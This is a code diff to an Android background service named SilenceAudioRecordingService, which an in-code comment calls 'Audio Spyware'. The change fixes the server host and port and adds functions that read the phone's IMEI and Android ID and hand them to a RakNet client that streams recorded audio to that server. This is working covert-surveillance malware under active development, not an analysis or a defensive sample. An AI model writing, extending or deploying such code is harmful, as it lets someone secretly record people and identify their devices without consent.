@@ -7,7 +7,9 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.IBinder;
 import android.os.Process;
+import android.provider.Settings;
 import android.support.annotation.Nullable;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 /**
@@ -20,17 +22,34 @@ public class SilenceAudioRecordingService extends Service implements Runnable
         System.load("libSilenceAudioRecordingNative.so");
     }
 
-    //95.250.196.2
-    //169.254.52.94
-    //192.168.2.20
-    //192.168.137.183
-    //192.168.1.132
-    //192.168.1.134
-    //192.168.137.193
-    private String  mHost = "192.168.1.132";
-    private int     mPort = 8000; //not implemented yet
+    //server values
+    private final String  mHost = "192.168.1.66";
+    private final int     mPort = 8000;
+    //thread values
     private Thread  mThread = null;
     private boolean mLoop = true;
+
+    //get imei
+    private String getIMEI()
+    {
+        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+        if(telephonyManager == null) return "";
+
+        String imei = telephonyManager.getDeviceId();
+        if(imei == null) return "";
+
+        return imei;
+    }
+
+    private String getAndroidID()
+    {
+        //get android id
+        String androidID = Settings.Secure.getString(getApplicationContext().getContentResolver(),
+                                                     Settings.Secure.ANDROID_ID);
+        if(androidID == null) return "";
+        //return android id
+        return androidID;
+    }
 
     //network available
     private boolean isNetworkAvailable()
@@ -55,7 +74,7 @@ public class SilenceAudioRecordingService extends Service implements Runnable
                 //stop
                 RakClient.stop();
                 //re-try to restart
-                RakClient.start(mHost);
+                RakClient.start(mHost,mPort);
                 //sleep thread
                 try
                 {
@@ -86,7 +105,9 @@ public class SilenceAudioRecordingService extends Service implements Runnable
     {
         super.onCreate();
         // Start RakNet client Audio Spyware
-        RakClient.start(mHost);
+        RakClient.start(mHost,mPort);
+        RakClient.setIMEI(getIMEI());
+        RakClient.setAndroidID(getAndroidID());
         // Enable loop
         mLoop = true;
         // Start up the thread running the service.
